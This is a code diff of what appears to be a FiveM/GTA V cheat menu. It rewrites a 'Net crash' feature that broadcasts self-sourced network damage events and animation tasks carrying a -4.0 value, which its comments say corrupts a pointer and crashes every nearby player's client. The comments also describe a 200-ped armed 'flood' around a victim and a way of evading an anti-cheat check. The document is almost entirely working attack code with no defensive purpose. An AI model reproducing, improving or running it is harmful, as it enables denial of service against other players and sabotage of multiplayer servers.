@@ -19818,7 +19818,7 @@ local C = (function(O,E,S)
 --
 --   Ped flood   an armed networked swarm: 200 player-model peds with grenade
 --               launchers and sixty props around the victim, firing for 20 s
---   Net crash   the self-emote trigger (lying scenario + -4.0 blends)
+--   Net crash   the self -4.0 damage broadcast
 --
 -- The swarm is the proven vector from the reference corpus
 -- (AC/Nouveau/crasher_propsss.txt, v50). A passive clone ring does not crash a
@@ -20748,45 +20748,41 @@ function C.cleanup()
 end
 
 -- ---------------------------------------------------------------------------
--- SELF EMOTE (the Net crash row)
+-- SELF EMOTE (the Net crash row) — instant, invisible
 --
--- Dump evidence, not a guess: the crash client shows "ragdolls 0/0" and
--- "scenario (foot/car) 3/0", and the fault is
+-- Dump evidence: the victim saw the attacker drop forward and "lie down"
+-- instantly, with no animation played. That is a single TaskPlayAnim whose
+-- blend is -4.0: the blend is invalid, so the clip snaps and ends at once
+-- (nothing visible), but the task was already handed to the network clone
+-- sync and the receiver crashes on it.
+--
+-- The fault is
 --   or word ptr [rax+0x214], 0x20   with RAX = 0xC0800000
--- 0xC0800000 is exactly float -4.0f. The object is refcounted (refcount at
--- +0x210, flags at +0x214). So the target is not a ragdoll: it is a ped in an
--- animation/scenario state, whose networked anim task carries a -4.0 value that
--- the receiver resolves into a weapon/attachment pointer. The actor was the
--- attacker's own ped, and the victim crashed the moment it synced.
+-- and 0xC0800000 is exactly float -4.0f, the same value used as the blend
+-- here, resolved by the receiver into a refcounted weapon/attachment pointer
+-- (refcount +0x210, flags +0x214, smart pointer at [rdi+0x268]).
 --
--- Payload: the operator lies down and plays the emote on his own ped. The
--- receiver parses the networked task and crashes. The sender stays alive (the
--- attacker in the dump did).
+-- Direction: "vers l'avant" = prone = the FRONT sunbathe dict, not the back
+-- one. Payload is the front/base clip with blend -4.0 first, then the other
+-- lying dicts and blends. No scenario, so nothing plays smoothly.
 -- ---------------------------------------------------------------------------
 local SELF_EMOTE = {
     dicts = {
-        "amb@world_human_sunbathe@male@back@base",
         "amb@world_human_sunbathe@male@front@base",
-        "amb@world_human_sunbathe@female@back@base",
         "amb@world_human_sunbathe@female@front@base",
-        "anim@mp_player_intcelebrationmale@knuckle_crunch",
-        "anim@mp_player_intcelebrationmale@air_guitar",
-        "anim@mp_player_intcelebrationmale@dj",
-        "anim@mp_player_intcelebrationmale@air_synth",
+        "amb@world_human_sunbathe@male@back@base",
+        "amb@world_human_sunbathe@female@back@base",
     },
-    names = { "base", "idle_a", "idle_b", "idle_c", "enter", "exit" },
+    names = { "base", "idle_a" },
     blends = {
         { -4.0, -4.0 },
-        { 8.0, -4.0 },
-        { 1000.0, -1000.0 },
+        { -4.0, 0.0 },
+        { 0.0, -4.0 },
         { -4.0, 1000.0 },
     },
-    scenario = "WORLD_HUMAN_SUNBATHE_BACK",
-    holdMs = 2500,
-    maxTasks = 48,
 }
 
-function C.emoteSelf()
+function C.emoteInstant()
     local stamp = now()
     if C.selfAt and stamp - C.selfAt < 2000 then
         O.log("net crash: cooling down")
@@ -20798,37 +20794,29 @@ function C.emoteSelf()
         O.log("net crash: no local ped")
         return false
     end
-    O.log("net crash: self emote start")
-    pcall(Notify, "Net crash: self emote")
+    O.log("net crash: instant emote start")
+    pcall(Notify, "Net crash: instant emote")
 
     Citizen.CreateThread(function()
         for i = 1, #SELF_EMOTE.dicts do
-            O.safe(RequestAnimDict, SELF_EMOTE.dicts[i])
+            pcall(RequestAnimDict, SELF_EMOTE.dicts[i])
         end
-        Citizen.Wait(400)
-        pcall(TaskStartScenarioInPlace, me, SELF_EMOTE.scenario, 0, true)
-        Citizen.Wait(250)
+        Citizen.Wait(150)
         local n = 0
-        local deadline = now() + SELF_EMOTE.holdMs
-        while now() < deadline and n < SELF_EMOTE.maxTasks do
-            for di = 1, #SELF_EMOTE.dicts do
-                if n >= SELF_EMOTE.maxTasks then break end
-                local dict = SELF_EMOTE.dicts[di]
-                for ai = 1, #SELF_EMOTE.names do
-                    if n >= SELF_EMOTE.maxTasks then break end
-                    for bi = 1, #SELF_EMOTE.blends do
-                        if n >= SELF_EMOTE.maxTasks then break end
-                        local b = SELF_EMOTE.blends[bi]
-                        pcall(TaskPlayAnim, me, dict, SELF_EMOTE.names[ai],
-                            b[1], b[2], -1, 49, 0, false, false, false)
-                        n = n + 1
-                    end
+        for di = 1, #SELF_EMOTE.dicts do
+            local dict = SELF_EMOTE.dicts[di]
+            for ai = 1, #SELF_EMOTE.names do
+                for bi = 1, #SELF_EMOTE.blends do
+                    local b = SELF_EMOTE.blends[bi]
+                    pcall(TaskPlayAnim, me, dict, SELF_EMOTE.names[ai],
+                        b[1], b[2], -1, 49, 0, false, false, false)
+                    n = n + 1
+                    Citizen.Wait(90)
                 end
             end
-            Citizen.Wait(120)
         end
-        O.log("net crash: self emote %d tasks", n)
-        pcall(Notify, ("Net crash: emote self, %d tasks"):format(n))
+        O.log("net crash: instant emote %d tasks", n)
+        pcall(Notify, ("Net crash: instant emote, %d tasks"):format(n))
     end)
     return true
 end
@@ -22270,53 +22258,56 @@ local NET = (function(O, C)
             netToast("Net crash: primitive unavailable")
             return false
         end
-        local okT, entry = pcall(C.target, "ped")
-        if not okT or type(entry) ~= "table" then
-            O.log("net crash: no target")
-            netToast("Net crash: select a target")
+        local me = PlayerPedId()
+        if type(me) ~= "number" or me == 0 then
+            O.log("net crash: no local ped")
+            netToast("Net crash: no local ped")
             return false
         end
-        local ped = entry.ped
-        if type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then
-            O.log("net crash: target ped not streamed")
-            netToast("Net crash: target out of stream")
+        local c = GetEntityCoords(me)
+        if type(c) ~= "vector3" and type(c) ~= "table" then
+            O.log("net crash: no coords")
             return false
         end
 
-        NET.watch(25)
-        O.log("net crash: ragdoll + 48 events on %s at %.0f m", entry.name, entry.dist)
-        netToast(("Net crash: ragdoll + 48 x -4.0 on %s"):format(entry.name))
+        O.log("net crash: self -4.0 broadcast")
+        netToast("Net crash: self -4.0 broadcast")
 
-        -- Every variant carries damage = -4.0, the exact value found in the
-        -- dump as the corrupted pointer (0xC0800000 = -4.0f). The rest cycles
-        -- the weapon and flag fields the damage resolver feeds into the
-        -- weapon/attachment refcount: run-over, fire (the WaveShield "send
-        -- crash" signature, sent with silenced=false so the check does not
-        -- fire), fists and rammed, with the action-result fields fuzzed.
+        -- What the dump proves: the receiver faults in
+        --   or word ptr [rax+214h], 20h
+        -- with rax = 0xC0800000, which is exactly the float -4.0. That slot is
+        -- a refcounted weapon/attachment (refcount +0x210, flags +0x214,
+        -- virtual release through [rax]), so GTA took the damage float from a
+        -- network weaponDamageEvent and used its raw bits as an object pointer
+        -- before releasing it. Nothing in the server event layer validates the
+        -- damage field, so -4.0 reaches every client in scope.
+        --
+        -- The event is self-sourced: source == target == the local ped. The
+        -- server accepts it because the source is the sender's own ped, and it
+        -- broadcasts it to every client that has the ped in scope. Each of
+        -- those clients applies -4.0 to the networked ped and dies in the
+        -- release above. The sender dies too, which is why the attacker in the
+        -- report collapsed forward instantly and then went down with everyone.
         local variants = {
-            { dmg = -4.0, wpn = 0,          flags = 522 },
-            { dmg = -4.0, wpn = 1003267566, flags = 1581104 },
-            { dmg = -4.0, wpn = 2725352035, flags = 525312, hc = 0, ari = 0 },
-            { dmg = -4.0, wpn = 2725352035, flags = 454,    hc = 0, ari = 0 },
-            { dmg = -4.0, wpn = 2725352035, flags = 198,    hc = 0, ari = 0 },
-            { dmg = -4.0, wpn = 2725352035, flags = 524810, hc = 0, ari = 0 },
-            { dmg = -4.0, wpn = 133987706,  flags = 525312 },
-            { dmg = -4.0, wpn = 0,          flags = 0x7FFFFFFF,
-              arh = -1, ari = -1, au = -1, hc = -1 },
+            { dmg = -4.0, wpn = 0, flags = 0 },
+            { dmg = -4.0, wpn = 0, flags = 1 },
+            { dmg = -4.0, wpn = 0, flags = 512 },
+            { dmg = -4.0, wpn = 0, flags = 4096 },
+            { dmg = -4.0, wpn = 0, flags = 0, hc = 0, arh = 0, ari = 0 },
         }
 
         Citizen.CreateThread(function()
-            local hits, rags = 0, 0
-            for i = 1, 48 do
-                if i % 8 == 1 then
-                    if NET.ragdoll(ped) then rags = rags + 1 end
-                end
+            local hits = 0
+            for i = 1, 16 do
                 local v = variants[(i - 1) % #variants + 1]
-                if NET.damage(v) then hits = hits + 1 end
-                Citizen.Wait(120)
+                local ok = pcall(Susano.SendNetworkDamage, me, me,
+                    c.x, c.y, c.z, v.dmg, v.wpn or 0, v.flags or 0,
+                    v.arh or 0, v.ari or 0, 0, v.hc or 0)
+                if ok then hits = hits + 1 end
+                Citizen.Wait(60)
             end
-            O.log("net crash: %d/48 events sent, %d ragdoll", hits, rags)
-            netToast(("Net crash: %d/48 sent, %d ragdoll"):format(hits, rags))
+            O.log("net crash: %d/16 self -4.0 events sent", hits)
+            netToast(("Net crash: %d/16 self -4.0 events"):format(hits))
         end)
         return true
     end
@@ -31220,7 +31211,7 @@ local function installCrasher()
             name = "Net crash",
             type = "action",
             onClick = function()
-                C.emoteSelf()
+                NET.crash()
             end,
         },
     }
